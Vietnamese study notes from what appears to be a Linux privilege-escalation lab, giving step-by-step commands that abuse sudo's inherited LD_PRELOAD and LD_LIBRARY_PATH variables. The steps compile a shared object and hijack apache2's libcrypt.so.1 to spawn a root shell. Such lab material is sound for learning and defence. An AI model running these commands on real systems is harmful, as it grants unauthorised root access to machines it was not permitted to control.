- Sudo có thể được thiết lập để thừa hướng biến môi trường từ môi trường của usr. Kiểm tra xem môi trường nào được kế thừa

      sudo -l
- LD_PRELOAD và LD_LIBRARY_PATH đều được thừa hưởng từ môi trường của usr khác. LD_PRELOAD load một shared objects trước những thứ khác khi một prog chạy. LD_LIBRARY_PATH cung cấp một danh sách các dir nơi mà các shared libraries được tìm kiếm đầu tiên.
- Tạo một shared object sử dụng code từ /home/user/tools/sudo/preload.c:

      gcc -fPIC -shared -nostartfilé -o /tmp/preload.so /home/user/tools/sudo/preload.c
- Chạy một trong những prog được cho phép chạy dưới quyền sudo (sudo -l), trong khi setting LD_PRELOAD tới full path của shared object mới

      sudo LD_PRELOAD=/tmp/preload.so program-name-here
- Một root shell sẽ xuất hiện. Thoát shell trước khi tiếp tục. Phụ thuộc vào prog mà bạn chọn, bạn có lẽ cần phải thoát khỏi nó
- Chạy ldd với apache2 để xem những shared libs nào được sử dụng bởi chương trình

      ldd /usr/sbin/apache2
- Tạo một shared object cùng tên với một trong những libs trong danh sách (libcrypt.so.1) sử dụng code ở /home/user/tools/sudo/library_path.c:

      gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
- Chạy apache2 với quyền sudo, trong khi setting LD_LIBRARY_PATH cho /tmp (nơi mà ta output shared objects được thực thi)

      sudo LD_LIBRARY_PATH=/tmp apache2
- Một root shell xuất hiện, thoát khỏi nó. Thử đổi tên /tmp/libcrypt.so.1 thành tên của library khác được sử dụng bởi apache2 và rerun apache2 với quyền sudo một lần nữa. Nếu nó không hoạt động, kiểm tra xem tại sao, và làm sao phải thay để library_path.c code để khiến nó hoạt động
